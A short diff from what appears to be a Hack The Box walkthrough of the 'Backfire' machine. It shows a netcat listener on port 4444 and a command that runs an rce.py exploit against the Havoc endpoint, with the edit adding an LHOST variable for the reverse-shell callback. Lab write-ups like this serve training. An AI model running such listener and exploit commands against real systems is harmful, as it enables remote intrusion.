@@ -295,7 +295,7 @@ nc -nvlp 4444
 
 ### Run rce.py
 ```bash
-python3 rce.py --target https://backfire.htb/havoc -i 127.0.0.1 -p 40056
+LHOST=YOUR-IP-ADDRESS python3 rce.py --target https://backfire.htb/havoc -i 127.0.0.1 -p 40056
 ```
 
 ![[/static/backfire/20250119192904.png]]
